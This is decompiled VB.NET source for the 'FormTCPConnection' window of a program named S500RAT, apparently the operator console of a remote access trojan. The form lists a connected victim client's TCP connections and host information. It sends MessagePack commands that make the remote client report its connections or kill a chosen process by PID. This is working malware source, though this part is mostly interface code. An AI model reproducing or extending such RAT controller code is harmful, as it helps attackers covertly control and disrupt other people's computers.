Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000036 RID: 54
	<DesignerGenerated()>
	Public Partial Class FormTCPConnection
		Inherits Form

		' Token: 0x06000F45 RID: 3909 RVA: 0x00085FE8 File Offset: 0x000841E8
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormTCPConnection_Load
			AddHandler MyBase.Resize, AddressOf Me.FormTCPConnection_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x1700063B RID: 1595
		' (get) Token: 0x06000F48 RID: 3912 RVA: 0x00087254 File Offset: 0x00085454
		' (set) Token: 0x06000F49 RID: 3913 RVA: 0x00087260 File Offset: 0x00085460
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700063C RID: 1596
		' (get) Token: 0x06000F4A RID: 3914 RVA: 0x000872A3 File Offset: 0x000854A3
		' (set) Token: 0x06000F4B RID: 3915 RVA: 0x000872AD File Offset: 0x000854AD
		Friend Overridable Property ControllContextMenuStrip As ContextMenuStrip

		' Token: 0x1700063D RID: 1597
		' (get) Token: 0x06000F4C RID: 3916 RVA: 0x000872B6 File Offset: 0x000854B6
		' (set) Token: 0x06000F4D RID: 3917 RVA: 0x000872C0 File Offset: 0x000854C0
		Friend Overridable Property RefreshList As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshList
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshList_Click
				Dim refreshList As ToolStripMenuItem = Me._RefreshList
				If refreshList IsNot Nothing Then
					RemoveHandler refreshList.Click, value2
				End If
				Me._RefreshList = value
				refreshList = Me._RefreshList
				If refreshList IsNot Nothing Then
					AddHandler refreshList.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700063E RID: 1598
		' (get) Token: 0x06000F4E RID: 3918 RVA: 0x00087303 File Offset: 0x00085503
		' (set) Token: 0x06000F4F RID: 3919 RVA: 0x00087310 File Offset: 0x00085510
		Friend Overridable Property KillProcess As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._KillProcess
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillProcess_Click
				Dim killProcess As ToolStripMenuItem = Me._KillProcess
				If killProcess IsNot Nothing Then
					RemoveHandler killProcess.Click, value2
				End If
				Me._KillProcess = value
				killProcess = Me._KillProcess
				If killProcess IsNot Nothing Then
					AddHandler killProcess.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700063F RID: 1599
		' (get) Token: 0x06000F50 RID: 3920 RVA: 0x00087353 File Offset: 0x00085553
		' (set) Token: 0x06000F51 RID: 3921 RVA: 0x0008735D File Offset: 0x0008555D
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000640 RID: 1600
		' (get) Token: 0x06000F52 RID: 3922 RVA: 0x00087366 File Offset: 0x00085566
		' (set) Token: 0x06000F53 RID: 3923 RVA: 0x00087370 File Offset: 0x00085570
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000641 RID: 1601
		' (get) Token: 0x06000F54 RID: 3924 RVA: 0x00087379 File Offset: 0x00085579
		' (set) Token: 0x06000F55 RID: 3925 RVA: 0x00087383 File Offset: 0x00085583
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x17000642 RID: 1602
		' (get) Token: 0x06000F56 RID: 3926 RVA: 0x0008738C File Offset: 0x0008558C
		' (set) Token: 0x06000F57 RID: 3927 RVA: 0x00087396 File Offset: 0x00085596
		Friend Overridable Property ListConnection As Guna2DataGridView

		' Token: 0x17000643 RID: 1603
		' (get) Token: 0x06000F58 RID: 3928 RVA: 0x0008739F File Offset: 0x0008559F
		' (set) Token: 0x06000F59 RID: 3929 RVA: 0x000873A9 File Offset: 0x000855A9
		Friend Overridable Property ImageList1 As ImageList

		' Token: 0x17000644 RID: 1604
		' (get) Token: 0x06000F5A RID: 3930 RVA: 0x000873B2 File Offset: 0x000855B2
		' (set) Token: 0x06000F5B RID: 3931 RVA: 0x000873BC File Offset: 0x000855BC
		Friend Overridable Property Timer2 As System.Windows.Forms.Timer

		' Token: 0x17000645 RID: 1605
		' (get) Token: 0x06000F5C RID: 3932 RVA: 0x000873C5 File Offset: 0x000855C5
		' (set) Token: 0x06000F5D RID: 3933 RVA: 0x000873CF File Offset: 0x000855CF
		Public Overridable Property ConnectionNum As Label

		' Token: 0x17000646 RID: 1606
		' (get) Token: 0x06000F5E RID: 3934 RVA: 0x000873D8 File Offset: 0x000855D8
		' (set) Token: 0x06000F5F RID: 3935 RVA: 0x000873E2 File Offset: 0x000855E2
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000647 RID: 1607
		' (get) Token: 0x06000F60 RID: 3936 RVA: 0x000873EB File Offset: 0x000855EB
		' (set) Token: 0x06000F61 RID: 3937 RVA: 0x000873F5 File Offset: 0x000855F5
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000648 RID: 1608
		' (get) Token: 0x06000F62 RID: 3938 RVA: 0x000873FE File Offset: 0x000855FE
		' (set) Token: 0x06000F63 RID: 3939 RVA: 0x00087408 File Offset: 0x00085608
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000649 RID: 1609
		' (get) Token: 0x06000F64 RID: 3940 RVA: 0x00087411 File Offset: 0x00085611
		' (set) Token: 0x06000F65 RID: 3941 RVA: 0x0008741B File Offset: 0x0008561B
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x1700064A RID: 1610
		' (get) Token: 0x06000F66 RID: 3942 RVA: 0x00087424 File Offset: 0x00085624
		' (set) Token: 0x06000F67 RID: 3943 RVA: 0x00087430 File Offset: 0x00085630
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700064B RID: 1611
		' (get) Token: 0x06000F68 RID: 3944 RVA: 0x00087473 File Offset: 0x00085673
		' (set) Token: 0x06000F69 RID: 3945 RVA: 0x0008747D File Offset: 0x0008567D
		Friend Overridable Property Column3 As DataGridViewImageColumn

		' Token: 0x1700064C RID: 1612
		' (get) Token: 0x06000F6A RID: 3946 RVA: 0x00087486 File Offset: 0x00085686
		' (set) Token: 0x06000F6B RID: 3947 RVA: 0x00087490 File Offset: 0x00085690
		Friend Overridable Property Column4 As DataGridViewTextBoxColumn

		' Token: 0x1700064D RID: 1613
		' (get) Token: 0x06000F6C RID: 3948 RVA: 0x00087499 File Offset: 0x00085699
		' (set) Token: 0x06000F6D RID: 3949 RVA: 0x000874A3 File Offset: 0x000856A3
		Friend Overridable Property Column2 As DataGridViewTextBoxColumn

		' Token: 0x1700064E RID: 1614
		' (get) Token: 0x06000F6E RID: 3950 RVA: 0x000874AC File Offset: 0x000856AC
		' (set) Token: 0x06000F6F RID: 3951 RVA: 0x000874B6 File Offset: 0x000856B6
		Friend Overridable Property Column5 As DataGridViewTextBoxColumn

		' Token: 0x1700064F RID: 1615
		' (get) Token: 0x06000F70 RID: 3952 RVA: 0x000874BF File Offset: 0x000856BF
		' (set) Token: 0x06000F71 RID: 3953 RVA: 0x000874C9 File Offset: 0x000856C9
		Friend Overridable Property Column6 As DataGridViewTextBoxColumn

		' Token: 0x17000650 RID: 1616
		' (get) Token: 0x06000F72 RID: 3954 RVA: 0x000874D2 File Offset: 0x000856D2
		' (set) Token: 0x06000F73 RID: 3955 RVA: 0x000874DC File Offset: 0x000856DC
		Friend Overridable Property Column1 As DataGridViewTextBoxColumn

		' Token: 0x17000651 RID: 1617
		' (get) Token: 0x06000F74 RID: 3956 RVA: 0x000874E5 File Offset: 0x000856E5
		' (set) Token: 0x06000F75 RID: 3957 RVA: 0x000874EF File Offset: 0x000856EF
		Public Property Client As Clients

		' Token: 0x17000652 RID: 1618
		' (get) Token: 0x06000F76 RID: 3958 RVA: 0x000874F8 File Offset: 0x000856F8
		' (set) Token: 0x06000F77 RID: 3959 RVA: 0x00087502 File Offset: 0x00085702
		Public Property F As FormS500

		' Token: 0x17000653 RID: 1619
		' (get) Token: 0x06000F78 RID: 3960 RVA: 0x0008750B File Offset: 0x0008570B
		' (set) Token: 0x06000F79 RID: 3961 RVA: 0x00087515 File Offset: 0x00085715
		Public Property FullPath As String

		' Token: 0x17000654 RID: 1620
		' (get) Token: 0x06000F7A RID: 3962 RVA: 0x0008751E File Offset: 0x0008571E
		' (set) Token: 0x06000F7B RID: 3963 RVA: 0x00087528 File Offset: 0x00085728
		Friend Property ParentClient As Clients

		' Token: 0x06000F7C RID: 3964 RVA: 0x00087534 File Offset: 0x00085734
		Private Sub FormTCPConnection_Load(sender As Object, e As EventArgs)
			Me.ListConnection.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(79, 46, 208)
			Me.ListConnection.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListConnection.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListConnection.AlternatingRowsDefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListConnection.DefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListConnection.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListConnection.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
			Me.ListConnection.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
			Me.ListConnection.CellBorderStyle = DataGridViewCellBorderStyle.None
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x06000F7D RID: 3965 RVA: 0x00087728 File Offset: 0x00085928
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x06000F7E RID: 3966 RVA: 0x00087794 File Offset: 0x00085994
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x06000F7F RID: 3967 RVA: 0x000877AC File Offset: 0x000859AC
		Private Sub FormTCPConnection_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x06000F80 RID: 3968 RVA: 0x00087840 File Offset: 0x00085A40
		Private Sub RefreshList_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "FormTCPConnection"
			msgPack.ForcePathObject("Option").AsString = "List"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x06000F81 RID: 3969 RVA: 0x000878A0 File Offset: 0x00085AA0
		Private Sub KillProcess_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListConnection.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListConnection.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "FormTCPConnection"
						msgPack.ForcePathObject("Option").AsString = "Kill"
						msgPack.ForcePathObject("PID").AsString = dataGridViewRow.Cells(2).Value.ToString()
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x040006F4 RID: 1780
		Private FormSize As Boolean
	End Class
End Namespace
